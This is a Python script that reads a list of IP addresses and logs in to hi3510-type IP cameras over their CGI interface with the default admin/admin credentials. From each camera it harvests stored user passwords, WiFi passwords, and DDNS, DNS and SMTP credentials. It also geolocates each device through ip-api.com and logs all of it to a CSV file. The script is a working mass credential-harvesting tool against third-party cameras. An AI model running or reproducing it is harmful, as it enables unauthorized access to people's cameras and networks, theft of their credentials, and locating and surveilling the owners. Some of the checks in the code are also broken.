#! /usr/bin/env python
# encoding: utf-8

import requests
import json
import random
import time
import re

def removeComma(str):
    newStr = str.replace(",","")
    return newStr

#Scans for WiFi - Non critical error. Appends wifi networks onto end of CSV 
#! DO NOT FORGET TO WRITE /N ONTO ROW
def getWifi(ip, user, password, headers,f):
    success = True
    try: 
        r = requests.get(f"http://{ip}/web/cgi-bin/hi3510/param.cgi?cmd=searchwireless", headers=headers, timeout=3, verify=False)
        cgi = str(r.text)

        if "Error" in cgi:
            print("Error Retrieving Wifi APs")
            print(cgi)
            success = False
        else:
            wifiAP = re.findall('"(.*?)"', str(r.text))

            if wifiAP[0] > 0:
                print("Found " + wifiAP[0] + " Access Points.")
                f.write(str(wifiAP) + "\n")
            else:
                success = False

    except Exception:
        print("Connection Timeout")
        success = False

    if success:
        print("Retrieved Nearby Wifi APs.")
    else:
        print("Error Retrieving Wifi APs")
        f.write("\n")

def getNumLines(fileName):
    with open(fileName) as f:
        for i, l in enumerate(f):
            pass
    return i + 1

#Removes :XX from passed in IP 
def removePort(ip):
    portless = re.sub(r':(\d{1,5})', '', str(ip))
    return portless

def getIPInfo(ip, f, headers):
    #Get json response
    r = requests.get("http://ip-api.com/json/" + removePort(ip), headers=headers, timeout=3, verify=False)
    try:
        #if the response doesnt contain HTML error code 200, continue
        if r.status_code == 200 not in r.content:
            country = ""
            region = ""
            isp = ""
            city = ""
            lat = ""
            long = ""
            organization = ""
            asname = ""

            ret = json.loads(r.content)
            if ret["status"] == "success":
                country = removeComma(ret["country"])
                region = removeComma(ret["region"])
                city = removeComma(ret["city"])
                isp = removeComma(ret["isp"])
                lat = removeComma(str(ret["lat"]))
                long = removeComma(str(ret["lon"]))
                organization = removeComma(ret["org"])
                asname = removeComma(ret["as"])

            geoData = country, region, city, isp, lat, long, organization, asname
            print("Retrieved geographic data.")
            
            f.write(str(geoData) + "\n")  
        else:
            print("Error retrieving: " + ip)
    except Exception:
        print("Exception retrieving: " + ip)

def getCamInfo(ip, f, headers):
    user = "admin"
    password = "admin"
    success = True

    try:   

        r = requests.get(f"http://{ip}/web/cgi-bin/hi3510/param.cgi?usr={user}&pwd={password}&cmd=getserverinfo&cmd=getobjattr&cmd=getnetattr&cmd=getuserattr&cmd=getservertime&cmd=getinterip&cmd=getstreamnum&cmd=getourddnsattr&cmd=getinfrared&cmd=get3thddnsattr&cmd=getaudioflag&cmd=getdevtype&cmd=getwirelessattr&cmd=getsmtpattr&cmd=getftpattr", headers=headers, timeout=3, verify=False)
        cgi = str(r.text)

        if "Error" in cgi:
            print("Error Retrieving Info for " + ip)
            print(cgi)
            success = False
        else:
            print("Retrieved camera data.")
            camData = re.findall('"(.*?)"', str(r.text))
            #Duplicates caused by getserverinfo, pop off the first 14 results
            camData = camData[13:]
            f.write(ip + "," + str(camData) + ",")
    except Exception:
        print("Connection Timeout")
        success = False

    if success:
        #get wifi geolocation data
        getIPInfo(ip, f, headers)

        #print(camData[53])
        #if wifi is ON
        #if "1" in str(camData[53]):
        #    getWifi(ip, user, password, headers, f)
    else:
        print("Failed to process " + ip)

if __name__ == "__main__":

    #File to write to: 
    filename = "admin1.csv"
    #File with IPs seperated by /n
    IPfile = "adminIPsmall.txt"

    headers = {'User-Agent': "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2a1pre) Gecko/20090428 Firefox/3.6a1pre"}
    numLines = getNumLines(IPfile)
    with open(filename, "a", encoding="utf-8") as f:
        #                                                                      Camera Info:    [0]          
        f.write("IP,CameraModel,HardwareVer,SoftwareVer,WebVer,CamName,StartupDate,UPNPStatus,DDNSConnection,DDNSStatus,PlatformStatus,SDStatus,SDFreeSpace,SDTotalSpace,ObjectStatus,ObjectUID,DHCPStatus,LocalIP,Netmask,Gateway,DNSStatus,DNS1IP,DNS2IP,MacAddress,NetworkType,User1,Password1,User1Level,User2,Password2,User2Level,User3,Password3,User3Level,Time,TimeZone,DSTStatus,WANIP,StreamNum,DDNSStatus,DDNSServer,DDNSPort,DDNSUser,DDNSPassword,DDNSDomain,DDNSInterval,IRStatus,DNSStatus,DNSService,DNSUser,DNSPassword,DNSDomain,AudioFlag,DeviceType,WifiStatus,WifiSSID,WifiAuth,WifiPassword,WifiEnc,WifiMode,SMTPServer,SMTPPort,SMTPSSL,SMTPLoginType,SMTPUser,SMTPPassword,SMTPFrom,SMTPTo,SMTPSubject,SMTPText,Country,Region,City,ISP,Latitude,Longitude,Organization,ASName, Wifi APs\n")
        count = 1
        for line in open(IPfile).readlines():
            start = time.time()
            ip = line.strip()

            print("Processing " + ip + " (" + str(count) + "/" + str(numLines) + ")")
            getCamInfo(ip, f, headers)

            end = time.time()
            count = count + 1
            print("Processed in: " + str(round(end - start, 2)) + " seconds.\n")
        
        f.close()